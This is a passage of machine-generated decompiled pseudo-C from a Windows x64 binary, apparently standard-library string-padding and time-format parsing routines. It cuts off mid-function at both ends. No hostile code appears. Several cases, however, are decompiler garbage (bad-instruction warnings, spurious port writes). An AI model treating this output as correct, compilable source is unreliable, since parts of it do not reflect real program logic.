code_r0x00014003f01e;\n    case 0x6c:\n        ppiVar70 = unaff_RBX & 0xffffffff00000000 | ppiVar60 & 0xffffffff;\n        goto code_r0x00014003f074;\n    case 0x6d:\n        out(0xb0, uVar52);\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *0x18888044c = *0x18888044c + -0x30;\n        goto code_r0x00014003e786;\n    case 0x6e:\n        goto code_r0x00014003e72c;\n    case 0x6f:\n        *unaff_RDI = *unaff_RDI + -0x30;\n        unaff_RDI = unaff_RBP * 2;\ncode_r0x00014003e6fb:\n        *(ppiVar81 + 0x20) = 0;\n        iVar67 = unaff_RBP * 2;\n        *(ppiVar81 + -8) = 0x14003e71d;\n        fcn.1400a5030(*(ppiVar81 + 0x38), 0, unaff_R12, iVar67);\n        unaff_R15 = iVar67 + unaff_RDI;\n        unaff_R12 = *(ppiVar81 + 0xa0);\n        ppiVar88 = arg1[3];\n        ppiVar40 = ppiVar81;\n        ppiVar89 = unaff_R14;\ncode_r0x00014003e72c:\n        ppiVar72 = ppiVar40;\n        uVar51 = unaff_RBP;\n        piVar55 = arg1[2];\n        uVar49 = *(arg1 + 0x24);\n        *(ppiVar72 + 0x28) = unaff_R15;\n        *(ppiVar72 + 0x20) = unaff_RDI;\n        *(ppiVar72 + -8) = 0x14003e746;\n        iVar67 = fcn.1400b0190(unaff_R12, uVar49, piVar55, ppiVar88);\n        ppiVar88 = *(ppiVar72 + 0xa8);\n        unaff_R14 = iVar67 - unaff_R12 >> 1;\n        if (ppiVar88 < unaff_R14) goto code_r0x00014003ed7c;\n        *(ppiVar72 + 0xa8) = unaff_R14;\n        *(*(ppiVar72 + 0xa0) + (iVar67 - unaff_R12)) = 0;\n        iVar85 = *(arg1 + 0xb);\n        unaff_R12 = unaff_R14;\n        unaff_R14 = ppiVar89;\ncode_r0x00014003e77e:\n        if (0 < iVar85) {\n            puVar56 = unaff_R12 + 1;\n            *(ppiVar72 + 0x50) = *(arg1 + 0x22);\n            iVar67 = *(ppiVar72 + 0xa0);\n            if (iVar67 == *(ppiVar72 + 0x68)) {\n                puVar71 = 0x7;\n            }\n            else {\n                puVar71 = *(ppiVar72 + 0xb0);\n            }\n            if (puVar71 < puVar56) {\n                *(ppiVar72 + 0x20) = 1;\n                *(ppiVar72 + -8) = 0x14003ece4;\n                fcn.1400a6e10(*(ppiVar72 + 0x38), unaff_R12, 0, 0);\n                iVar67 = *(ppiVar72 + 0xa0);\n            }\n            ppiVar88 = NULL;\n            *(iVar67 + unaff_R12 * 2) = *(ppiVar72 + 0x50);\n            *(ppiVar72 + 0xa8) = puVar56;\n            *(iVar67 + 2 + unaff_R12 * 2) = 0;\n            if (uVar51 < 0) {\n                ppiVar60 = NULL;\n                ppiVar88 = -uVar51;\n                *(ppiVar72 + 0x20) = *(arg1 + 0x66);\n                *(ppiVar72 + -8) = 0x14003ec6d;\n                fcn.1400a5030(*(ppiVar72 + 0x38), puVar56, 0, ppiVar88);\n                if (unaff_R14 <= 0x1fffffffffffffff - *(ppiVar72 + 0xa8)) goto code_r0x00014003eb09;\ncode_r0x00014003ed58:\n                *(ppiVar72 + -8) = 0x14003ed64;\n                fcn.1400b7170(0x1400fe0e2);\ncode_r0x00014003ed64:\n                *(ppiVar72 + -8) = 0x14003ed70;\n                fcn.1400b7170(0x1400fe0e2);\n                unaff_R14 = ppiVar60;\n            }\n            else {\n                unaff_R14 = *(arg1 + 0xb);\n                unaff_RDI = unaff_RDI + uVar51 * 2;\n                if (unaff_R14 <= 0x1fffffffffffffff - puVar56) {\ncode_r0x00014003eb09:\n                    *(ppiVar72 + -8) = 0x14003eb13;\n                    fcn.1400a6c40(*(ppiVar72 + 0x38), unaff_RDI, unaff_R14);\n                    unaff_R12 = *(ppiVar72 + 0xa8);\n                    goto code_r0x00014003e786;\n                }\n            }\n            *(ppiVar72 + -8) = 0x14003ed7c;\n            fcn.1400b7170(0x1400fe0e2);\ncode_r0x00014003ed7c:\n            *(ppiVar72 + -8) = 0x14003ed8f;\n            uVar58 = fcn.1400b1a60(0x1400fe138, 0x1400fe124, unaff_R14, ppiVar88);\n            *(ppiVar72 + -8) = 0x14003ed97;\n            fcn.1400b6670(uVar58);\n            pcVar3 = (*arg1)[1];\n            *(ppiVar72 + -8) = 0x14003eda0;\n            (*pcVar3)(arg1);\n            do {\n                *(ppiVar72 + -8) = 0x14003eda5;\n                uVar58 = fcn.1400b6b70();\n                *(ppiVar72 + -8) = 0x14003edad;\n                fcn.1400b6670(uVar58);\n            } while( true );\n        }\ncode_r0x00014003e786:\n        uVar51 = *(unaff_RSI + 3);\n        *(ppiVar72 + 0x78) = uVar51 & 0xb0;\n        unaff_R15 = *(ppiVar72 + 0x40) + unaff_R12;\n        if ((uVar51 & 0x200) != 0) {\n            unaff_R15 = unaff_R15 + arg1[6];\n        }\n        puVar56 = ppiVar72 + 0xd0;\n        puVar66 = ppiVar72 + 0xc0;\n        ppiVar60 = NULL;\n        *(ppiVar72 + 200) = 0;\n        arg3 = unaff_R15 * 2;\ncode_r0x00014003e7ca:\n        *(ppiVar72 + 0x50) = puVar66;\n        *(ppiVar72 + 0x60) = puVar56;\n        *(ppiVar72 + 0xc0) = puVar56;\n        *(ppiVar72 + 0xd0) = ppiVar60;\n        *(ppiVar72 + -8) = 0x14003e7ea;\n        fcn.1400a6b00(puVar66, arg3);\n        ppiVar70 = unaff_RSI[2];\n        puVar86 = ppiVar72 + 0x9c;\n        ppiVar75 = *(ppiVar72 + 200);\n        *(ppiVar72 + 0x7d) = *(ppiVar72 + 0x78) == 0x10 && unaff_R15 < ppiVar70;\n        do {\n            if (*puVar86 < 5) {\n                switch(*puVar86) {\n                case 0:\n                    if (*(ppiVar72 + 0x7d) != '\\0') {\ncode_r0x00014003e947:\n                        ppiVar88 = ppiVar70 - unaff_R15;\n                        *(ppiVar72 + 0x20) = *(ppiVar72 + 0x4a);\n                        *(ppiVar72 + -8) = 0x14003e966;\n                        fcn.1400a5030(*(ppiVar72 + 0x50), ppiVar75, 0, ppiVar88);\n                        goto code_r0x00014003e9a0;\n                    }\n                    break;\n                case 1:\ncode_r0x00014003e8e0:\n                    if (*(ppiVar72 + 0x7d) != '\\0') goto code_r0x00014003e947;\n                    *(ppiVar72 + 0x70) = ppiVar75 + 1;\n                    iVar67 = *(ppiVar72 + 0xc0);\n                    if (iVar67 == *(ppiVar72 + 0x60)) {\n                        uVar59 = 7;\n                    }\n                    else {\n                        uVar59 = *(ppiVar72 + 0xd0);\n                    }\n                    if (uVar59 < *(ppiVar72 + 0x70)) {\n                        ppiVar88 = NULL;\n                        *(ppiVar72 + 0x20) = 1;\n                        *(ppiVar72 + -8) = 0x14003ed14;\n                        fcn.1400a6e10(*(ppiVar72 + 0x50), ppiVar75, 0, 0);\n                        iVar67 = *(ppiVar72 + 0xc0);\n                    }\n                    ppiVar60 = *(ppiVar72 + 0x70);\n                    *(iVar67 + ppiVar75 * 2) = *(ppiVar72 + 0x4a);\n                    *(ppiVar72 + 200) = ppiVar60;\n                    *(iVar67 + 2 + ppiVar75 * 2) = 0;\n                    ppiVar75 = ppiVar60;\n                    break;\n                case 2:\n                    if ((*(unaff_RSI + 0x19) & 2) != 0) {\n                        ppiVar60 = arg1[6];\n                        piVar55 = arg1[5];\n                        if (ppiVar60 <= 0x1fffffffffffffff - ppiVar75) goto code_r0x00014003e996;\n                        *(ppiVar72 + -8) = 0x14003e8dc;\n                        fcn.1400b7170(0x1400fe0e2);\n                        goto code_r0x00014003e8e0;\n                    }\n                    break;\n                case 3:\n                    if (*(ppiVar72 + 0x40) != 0) {\n                        *(ppiVar72 + 0x7e) = **(ppiVar72 + 0x58);\n                        *(ppiVar72 + 0x70) = ppiVar75 + 1;\n                        iVar67 = *(ppiVar72 + 0xc0);\n                        if (iVar67 == *(ppiVar72 + 0x60)) {\n                            uVar59 = 7;\n                        }\n                        else {\n                            uVar59 = *(ppiVar72 + 0xd0);\n                        }\n                        if (uVar59 < *(ppiVar72 + 0x70)) {\n                            ppiVar88 = NULL;\n                            *(ppiVar72 + 0x20) = 1;\n                            *(ppiVar72 + -8) = 0x14003ecb4;\n                            fcn.1400a6e10(*(ppiVar72 + 0x50), ppiVar75, 0, 0);\n                            iVar67 = *(ppiVar72 + 0xc0);\n                        }\n                        *(iVar67 + ppiVar75 * 2) = *(ppiVar72 + 0x7e);\n                        ppiVar60 = *(ppiVar72 + 0x70);\n                        *(ppiVar72 + 200) = ppiVar60;\n                        *(iVar67 + 2 + ppiVar75 * 2) = 0;\n                        ppiVar75 = ppiVar60;\n                    }\n                    break;\n                case 4:\n                    ppiVar60 = *(ppiVar72 + 0xa8);\n                    piVar55 = *(ppiVar72 + 0xa0);\n                    if (0x1fffffffffffffff - ppiVar75 < ppiVar60) {\n                        *(ppiVar72 + -8) = 0x14003ed58;\n                        fcn.1400b7170(0x1400fe0e2);\n                        goto code_r0x00014003ed58;\n                    }\ncode_r0x00014003e996:\n                    *(ppiVar72 + -8) = 0x14003e9a0;\n                    fcn.1400a6c40(*(ppiVar72 + 0x50), piVar55, ppiVar60);\ncode_r0x00014003e9a0:\n                    ppiVar75 = *(ppiVar72 + 200);\n                }\n            }\n            puVar86 = puVar86 + 1;\n        } while (*(ppiVar72 + 0x38) != puVar86);\n        if (1 < *(ppiVar72 + 0x40)) {\n            ppiVar60 = *(ppiVar72 + 0x40) - 1;\n            if (0x1fffffffffffffff - ppiVar75 < ppiVar60) goto code_r0x00014003ed64;\n            *(ppiVar72 + -8) = 0x14003eb50;\n            fcn.1400a6c40(*(ppiVar72 + 0x50), *(ppiVar72 + 0x58) + 2, ppiVar60);\n            ppiVar75 = *(ppiVar72 + 200);\n        }\n        if (ppiVar75 < ppiVar70) {\n            *(ppiVar72 + 0x20) = *(ppiVar72 + 0x4c);\n            if (*(ppiVar72 + 0x78) == 0x20) {\n                *(ppiVar72 + -8) = 0x14003eb6d;\n                fcn.1400a5030(*(ppiVar72 + 0x50), ppiVar75, 0, ppiVar70 - ppiVar75);\n                ppiVar75 = ppiVar70;\n            }\n            else {\n                *(ppiVar72 + -8) = 0x14003e9f7;\n                fcn.1400a5030(*(ppiVar72 + 0x50), 0, 0, ppiVar70 - ppiVar75);\n                ppiVar75 = ppiVar70;\n            }\n        }\n        iVar67 = *(ppiVar72 + 0xc0);\n        uVar59 = unaff_R13 & 0xffffffff;\n        if (unaff_R13 == '\\0') {\n            pcVar3 = *(**(ppiVar72 + 0x30) + 0x60);\n            *(ppiVar72 + -8) = 0x14003ea1b;\n            iVar57 = (*pcVar3)(*(ppiVar72 + 0x30), iVar67, ppiVar75);\n            iVar67 = *(ppiVar72 + 0xc0);\n            if (ppiVar75 != iVar57) {\n                uVar59 = 1;\n            }\n        }\n        *(ppiVar72 + 0x88) = uVar59 & 0xff;\n        unaff_R13 = unaff_R13 & 0xffffffffffffff00 | uVar59 & 0xff;\n        *(ppiVar72 + 0x80) = *(ppiVar72 + 0x30);\n        if (iVar67 != *(ppiVar72 + 0x60)) {\n            *(ppiVar72 + -8) = 0x14003ea5b;\n            fcn.1400b64d0(iVar67);\n        }\n        if (*(ppiVar72 + 0xa0) != *(ppiVar72 + 0x68)) {\n            *(ppiVar72 + -8) = 0x14003ea76;\n            fcn.1400b64d0();\n        }\ncode_r0x00014003e62e:\n        ppiVar88 = *(ppiVar72 + 0x130);\n        unaff_RSI[2] = NULL;\n        piVar55 = *(ppiVar72 + 0x30);\n        ppiVar88[1] = unaff_R13;\n        *ppiVar88 = piVar55;\n        return ppiVar88;\n    case 0x70:\n        ppiVar72 = &stack0xffffffffffffff90;\n        ppiVar81 = &stack0xffffffffffffff90;\n        if ((ppiVar60 & 0x40) != 0) {\n            unaff_RDI = unaff_RDI + 2;\n        }\n        ppiVar88 = unaff_RDI + (ppiVar60 & 0xffffffffffffff40) * 2;\n        uStack120 = 0x14003e623;\n        iVar67 = (**(*unaff_RBP + 0x28))(uVar58);\n        unaff_R14 = iVar67 - unaff_RDI >> 1;\n        if (unaff_R14 == NULL) goto code_r0x00014003e62e;\n        in_stack_00000030 = &stack0x00000040;\n        in_stack_00000038 = NULL;\n        in_stack_00000040 = in_stack_00000040 & 0xffffffffffff0000;\n        uStack120 = 0x14003e6d2;\n        fcn.1400a6b00(&stack0x00000030, iVar67 - unaff_RDI);\n        iVar85 = *(arg1 + 0xb);\n        uVar51 = unaff_R14 - iVar85;\n        unaff_RBP = uVar51;\n        ppiVar72 = &stack0xffffffffffffff90;\n        unaff_R12 = in_stack_00000038;\n        if (0 < uVar51) {\n            if (iVar85 < 0) {\n                unaff_RBP = unaff_R14 & 0xffffffff;\n            }\n            uVar51 = unaff_RBP;\n            if (arg1[3] != NULL) goto code_r0x00014003e6fb;\n            iStack80 = uVar51;\n            uStack120 = 0x14003ec3a;\n            ppiVar88 = unaff_RDI;\n            fcn.1400a46d0(&stack0x00000030, 0, in_stack_00000038, unaff_RDI);\n            iVar85 = *(arg1 + 0xb);\n            ppiVar72 = &stack0xffffffffffffff90;\n            unaff_R12 = in_stack_00000038;\n        }\n        goto code_r0x00014003e77e;\n    case 0x71:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        puVar86 = arg1 + -0x73;\n        uVar45 = *puVar86;\n        *puVar86 = *puVar86 - 0x30;\n        puVar56 = ppiVar60 & 0xffffffffffffff00 | uVar43 + 0x3f + (0x2f < uVar45);\n        ppiVar72 = &piStack104;\n        ppiVar60 = in_stack_00000030;\n        goto code_r0x00014003e7ca;\n    case 0x72:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x73:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x75:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x76:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x77:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x78:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x79:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7b:\n        ppiVar78 = &piStack104;\ncode_r0x000140034852:\n        *(ppiVar78 + 0x130) = in_XMM1_Da;\n        *(ppiVar78 + 0x134) = in_XMM1_Db;\n        *(ppiVar78 + 0x138) = in_XMM1_Dc;\n        *(ppiVar78 + 0x13c) = in_XMM1_Dd;\n        in_XMM1_Da = *(ppiVar78 + 0xc0);\n        in_XMM1_Db = *(ppiVar78 + 0xc4);\n        in_XMM1_Dc = *(ppiVar78 + 200);\n        in_XMM1_Dd = *(ppiVar78 + 0xcc);\n        *(ppiVar78 + 0x98) = ppiVar60;\n        *(ppiVar78 + 0x40) = ppiVar78 + 0xd8;\n        *(ppiVar78 + 0x90) = unaff_RDI;\n        *(ppiVar78 + 0x38) = *(ppiVar78 + 0x270);\n        *(ppiVar78 + 0x28) = ppiVar78 + 0xe0;\ncode_r0x00014003489a:\n        *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n        *(ppiVar78 + 0xe0) = in_XMM6_Da;\n        *(ppiVar78 + 0xe4) = in_XMM6_Db;\n        *(ppiVar78 + 0xe8) = in_XMM6_Dc;\n        *(ppiVar78 + 0xec) = in_XMM6_Dd;\n        *(ppiVar78 + 0xf0) = in_XMM5_Da;\n        *(ppiVar78 + 0xf4) = in_XMM5_Db;\n        *(ppiVar78 + 0xf8) = in_XMM5_Dc;\n        *(ppiVar78 + 0xfc) = in_XMM5_Dd;\n        *(ppiVar78 + 0x100) = in_XMM4_Da;\n        *(ppiVar78 + 0x104) = in_XMM4_Db;\n        *(ppiVar78 + 0x108) = in_XMM4_Dc;\n        *(ppiVar78 + 0x10c) = in_XMM4_Dd;\n        *(ppiVar78 + 0x110) = in_XMM3_Da;\n        *(ppiVar78 + 0x114) = in_XMM3_Db;\n        *(ppiVar78 + 0x118) = in_XMM3_Dc;\n        *(ppiVar78 + 0x11c) = in_XMM3_Dd;\n        *(ppiVar78 + 0x120) = puVar94;\n        *(ppiVar78 + 0x128) = puVar95;\n        *(ppiVar78 + 0x140) = auVar93;\n        *(ppiVar78 + 0xa0) = in_XMM1_Da;\n        *(ppiVar78 + 0xa4) = in_XMM1_Db;\n        *(ppiVar78 + 0xa8) = in_XMM1_Dc;\n        *(ppiVar78 + 0xac) = in_XMM1_Dd;\n        *(ppiVar78 + -8) = 0x1400348e4;\n        fcn.140032f70(puVar66, arg3, in_stack_00000030, in_stack_00000038, *(ppiVar78 + 0x20), *(ppiVar78 + 0x28), \n                      *(ppiVar78 + 0x30), *(ppiVar78 + 0x38), *(ppiVar78 + 0x40), *(ppiVar78 + 0x48), *(ppiVar78 + 0x50)\n                      , *(ppiVar78 + 0x58), *(ppiVar78 + 0x60), *(ppiVar78 + 0x68), *(ppiVar78 + 0x70), \n                      *(ppiVar78 + 0x78), *(ppiVar78 + 0x80));\n        unaff_R13 = *(ppiVar78 + 0xb0);\n        unaff_RSI = *(ppiVar78 + 0xb8);\n        *(ppiVar78 + 0xc0) = unaff_R13;\n        *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n        *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n        if (*(ppiVar78 + 0xd8) == 0) {\n            *(*(ppiVar78 + 0x280) + 0x18) = *(ppiVar78 + 0xdc) % 7;\n            **(ppiVar78 + 0x290) = **(ppiVar78 + 0x290) | 2;\n        }\ncode_r0x0001400340c1:\n        *(ppiVar78 + 0x58) = *(ppiVar78 + 0x58) + 1;\n        iStack0000000000000060 = unaff_RSI;\n        ppiVar75 = ppiVar78;\njoined_r0x000140033f92:\n        uVar91 = iStack0000000000000060 == -1;\n        uVar43 = uVar91;\n        if ((unaff_R13 != NULL) && (uVar91)) {\n            unaff_R15 = uVar91;\n            if (*(unaff_R13 + 0x10) < *(unaff_R13 + 0x18)) {\n                iVar47 = **(unaff_R13 + 0x10);\n            }\n            else {\ncode_r0x0001400344f0:\n                uVar43 = unaff_R15;\n                pcVar3 = (*unaff_R13)[9];\n                *(ppiVar75 + -8) = 0x1400344fa;\n                iVar47 = (*pcVar3)(unaff_R13);\n            }\n            if (iVar47 == -1) {\n                *(ppiVar75 + 0xc0) = 0;\n            }\n            uVar91 = iVar47 == -1;\n            bVar90 = unaff_RDI != NULL & arg1;\n            ppiVar78 = ppiVar75;\n            if (bVar90 != false) goto code_r0x000140034118;\ncode_r0x000140033fb3:\n            if (uVar91 != arg1) goto code_r0x000140033fbe;\ncode_r0x000140034150:\n            ppiVar88 = *(ppiVar78 + 0x250);\n            puVar62 = *(ppiVar78 + 0x278);\n            if ((*(ppiVar78 + 0x58) == *(ppiVar78 + 0x68)) && (*(ppiVar78 + 100) == 0)) goto code_r0x00014003417b;\ncode_r0x000140034177:\n            *puVar62 = *puVar62 | 4;\ncode_r0x00014003417b:\n            uVar2 = *(ppiVar78 + 0xc4);\n            uVar6 = *(ppiVar78 + 200);\n            uVar7 = *(ppiVar78 + 0xcc);\n            *ppiVar88 = *(ppiVar78 + 0xc0);\n            *(ppiVar88 + 4) = uVar2;\n            *(ppiVar88 + 1) = uVar6;\n            *(ppiVar88 + 0xc) = uVar7;\n            return ppiVar88;\n        }\n        bVar90 = unaff_RDI != NULL & arg1;\n        ppiVar78 = ppiVar75;\n        if (bVar90 == false) goto code_r0x000140033fb3;\ncode_r0x000140034118:\n        if (unaff_RDI[2] < unaff_RDI[3]) {\n            iVar47 = *unaff_RDI[2];\n        }\n        else {\n            pcVar3 = (*unaff_RDI)[9];\n            *(ppiVar78 + -8) = 0x1400344e1;\n            iVar47 = (*pcVar3)(unaff_RDI);\n        }\n        if (iVar47 == -1) {\n            unaff_RDI = NULL;\n        }\n        else {\n            bVar90 = false;\n        }\n        if (uVar91 == bVar90) goto code_r0x000140034150;\ncode_r0x000140033fbe:\n        iVar47 = unaff_RSI;\n        if (*(ppiVar78 + 0x68) <= *(ppiVar78 + 0x58)) goto code_r0x000140034150;\n        if (*(ppiVar78 + 100) != 0) {\n            ppiVar88 = *(ppiVar78 + 0x250);\n            puVar62 = *(ppiVar78 + 0x278);\n            goto code_r0x000140034177;\n        }\n        uVar58 = *(ppiVar78 + 0x58);\n        pcVar3 = (*unaff_R12)[0xc];\n        *(ppiVar78 + -8) = 0x140033fff;\n        cVar42 = (*pcVar3)(unaff_R12);\n        if (cVar42 != '%') goto code_r0x000140034007;\n        pcVar3 = (*unaff_R12)[0xc];\n        *(ppiVar78 + -8) = 0x1400341f2;\n        cVar42 = (*pcVar3)(unaff_R12);\n        *(ppiVar78 + 0xdc) = 0;\n        if ((cVar42 == 'E') || (cVar42 == 'O')) {\n            *(ppiVar78 + 0x58) = *(ppiVar78 + 0x58) + 2;\n            pcVar3 = (*unaff_R12)[0xc];\n            *(ppiVar78 + -8) = 0x1400343c8;\n            cVar42 = (*pcVar3)(unaff_R12);\n        }\n        else {\n            *(ppiVar78 + 0x58) = *(ppiVar78 + 0x58) + 1;\n        }\n        uVar51 = (uVar58 * 2 & 0xffffff00U | unaff_RDI != NULL) & arg1;\n        unaff_RBP = uVar51;\n        ppiVar77 = ppiVar78;\n        switch(cVar42 + -0x25) {\n        case '\\0':\n            unaff_R13 = *(ppiVar78 + 0xc0);\n            if ((unaff_R13 != NULL) && (uVar43 != 0)) {\n                if (unaff_R13[2] < unaff_R13[3]) {\n                    iVar47 = *unaff_R13[2];\n                }\n                else {\n                    pcVar3 = (*unaff_R13)[9];\n                    *(ppiVar78 + -8) = 0x140035f4a;\n                    iVar47 = (*pcVar3)(unaff_R13);\n                }\n                if (iVar47 == -1) {\n                    *(ppiVar78 + 0xc0) = 0;\n                    unaff_R13 = NULL;\n                }\n            }\n            pcVar3 = (*unaff_R12)[10];\n            *(ppiVar78 + -8) = 0x140034a5d;\n            iVar48 = (*pcVar3)(unaff_R12);\n            if (iVar48 == iVar47) goto code_r0x000140034240;\n            *(ppiVar78 + 0xd8) = 4;\n            *(ppiVar78 + 100) = 4;\n            goto code_r0x0001400340c1;\n        default:\n            goto code_r0x0001400340a6;\n        case '\\x1c':\n        case '<':\n            goto code_r0x0001400347e9;\n        case '\\x1d':\n        case '=':\n        case 'C':\n            in_stack_00000038 = ppiVar78 + 0x90;\n            puVar66 = ppiVar78 + 0xb0;\n            in_stack_00000030 = ppiVar78 + 0xa0;\n            iVar67 = *(*(ppiVar78 + 0x80) + 0x10);\n            uVar2 = *(iVar67 + 0x15c);\n            uVar6 = *(iVar67 + 0x160);\n            uVar7 = *(iVar67 + 0x164);\n            uVar8 = *(iVar67 + 0x128);\n            uVar9 = *(iVar67 + 300);\n            uVar10 = *(iVar67 + 0x130);\n            uVar11 = *(iVar67 + 0x134);\n            uVar12 = *(iVar67 + 0x138);\n            uVar13 = *(iVar67 + 0x13c);\n            uVar14 = *(iVar67 + 0x140);\n            uVar15 = *(iVar67 + 0x144);\n            uVar16 = *(iVar67 + 0x148);\n            uVar17 = *(iVar67 + 0x14c);\n            uVar18 = *(iVar67 + 0x150);\n            uVar19 = *(iVar67 + 0x154);\n            uVar20 = *(iVar67 + 0x168);\n            uVar21 = *(iVar67 + 0x16c);\n            uVar22 = *(iVar67 + 0x170);\n            uVar23 = *(iVar67 + 0x174);\n            uVar24 = *(iVar67 + 0x178);\n            uVar25 = *(iVar67 + 0x17c);\n            uVar26 = *(iVar67 + 0x180);\n            uVar27 = *(iVar67 + 0x184);\n            in_XMM7_Da = *(iVar67 + 0x108);\n            in_XMM7_Db = *(iVar67 + 0x10c);\n            in_XMM7_Dc = *(iVar67 + 0x110);\n            in_XMM7_Dd = *(iVar67 + 0x114);\n            in_XMM6_Da = *(iVar67 + 0x118);\n            in_XMM6_Db = *(iVar67 + 0x11c);\n            in_XMM6_Dc = *(iVar67 + 0x120);\n            in_XMM6_Dd = *(iVar67 + 0x124);\n            uVar28 = *(iVar67 + 0xd8);\n            uVar29 = *(iVar67 + 0xdc);\n            uVar30 = *(iVar67 + 0xe0);\n            uVar31 = *(iVar67 + 0xe4);\n            uVar32 = *(iVar67 + 0xe8);\n            uVar33 = *(iVar67 + 0xec);\n            uVar34 = *(iVar67 + 0xf0);\n            uVar35 = *(iVar67 + 0xf4);\n            in_XMM8_Da = *(iVar67 + 0xf8);\n            in_XMM8_Db = *(iVar67 + 0xfc);\n            in_XMM8_Dc = *(iVar67 + 0x100);\n            in_XMM8_Dd = *(iVar67 + 0x104);\n            uVar36 = *(iVar67 + 200);\n            uVar37 = *(iVar67 + 0xcc);\n            uVar38 = *(iVar67 + 0xd0);\n            uVar39 = *(iVar67 + 0xd4);\n            *(ppiVar78 + 0x170) = *(iVar67 + 0x158);\n            *(ppiVar78 + 0x174) = uVar2;\n            *(ppiVar78 + 0x178) = uVar6;\n            *(ppiVar78 + 0x17c) = uVar7;\n            *(ppiVar78 + 0x140) = uVar8;\n            *(ppiVar78 + 0x144) = uVar9;\n            *(ppiVar78 + 0x148) = uVar10;\n            *(ppiVar78 + 0x14c) = uVar11;\n            *(ppiVar78 + 0x150) = uVar12;\n            *(ppiVar78 + 0x154) = uVar13;\n            *(ppiVar78 + 0x158) = uVar14;\n            *(ppiVar78 + 0x15c) = uVar15;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x160) = uVar16;\n            *(ppiVar78 + 0x164) = uVar17;\n            *(ppiVar78 + 0x168) = uVar18;\n            *(ppiVar78 + 0x16c) = uVar19;\n            *(ppiVar78 + 0x180) = uVar20;\n            *(ppiVar78 + 0x184) = uVar21;\n            *(ppiVar78 + 0x188) = uVar22;\n            *(ppiVar78 + 0x18c) = uVar23;\n            *(ppiVar78 + 400) = uVar24;\n            *(ppiVar78 + 0x194) = uVar25;\n            *(ppiVar78 + 0x198) = uVar26;\n            *(ppiVar78 + 0x19c) = uVar27;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0x40) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0xe0) = uVar36;\n            *(ppiVar78 + 0xe4) = uVar37;\n            *(ppiVar78 + 0xe8) = uVar38;\n            *(ppiVar78 + 0xec) = uVar39;\n            *(ppiVar78 + 0xf0) = uVar28;\n            *(ppiVar78 + 0xf4) = uVar29;\n            *(ppiVar78 + 0xf8) = uVar30;\n            *(ppiVar78 + 0xfc) = uVar31;\n            *(ppiVar78 + 0x100) = uVar32;\n            *(ppiVar78 + 0x104) = uVar33;\n            *(ppiVar78 + 0x108) = uVar34;\n            *(ppiVar78 + 0x10c) = uVar35;\ncode_r0x000140034605:\n            *(ppiVar78 + 0x110) = in_XMM8_Da;\n            *(ppiVar78 + 0x114) = in_XMM8_Db;\n            *(ppiVar78 + 0x118) = in_XMM8_Dc;\n            *(ppiVar78 + 0x11c) = in_XMM8_Dd;\n            *(ppiVar78 + 0x120) = in_XMM7_Da;\n            *(ppiVar78 + 0x124) = in_XMM7_Db;\n            *(ppiVar78 + 0x128) = in_XMM7_Dc;\n            *(ppiVar78 + 300) = in_XMM7_Dd;\n            *(ppiVar78 + 0x130) = in_XMM6_Da;\n            *(ppiVar78 + 0x134) = in_XMM6_Db;\n            *(ppiVar78 + 0x138) = in_XMM6_Dc;\n            *(ppiVar78 + 0x13c) = in_XMM6_Dd;\n            *(ppiVar78 + 0x30) = 0x18;\n            *(ppiVar78 + 0x38) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x28) = ppiVar78 + 0xe0;\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + -8) = 0x14003465b;\n            fcn.140032f70(puVar66, *(ppiVar78 + 600), in_stack_00000030, in_stack_00000038, *(ppiVar78 + 0x20), \n                          *(ppiVar78 + 0x28), *(ppiVar78 + 0x30), *(ppiVar78 + 0x38), *(ppiVar78 + 0x40), \n                          *(ppiVar78 + 0x48), *(ppiVar78 + 0x50), *(ppiVar78 + 0x58), *(ppiVar78 + 0x60), \n                          *(ppiVar78 + 0x68), *(ppiVar78 + 0x70), *(ppiVar78 + 0x78), *(ppiVar78 + 0x80));\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                *(*(ppiVar78 + 0x280) + 0x10) = *(ppiVar78 + 0xdc) % 0xc;\n                **(ppiVar78 + 0x290) = **(ppiVar78 + 0x290) | 0x408;\n            }\n            goto code_r0x0001400340c1;\n        case '\\x1e':\n            *(ppiVar78 + 0x30) = 99;\n            *(ppiVar78 + 0x28) = 0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 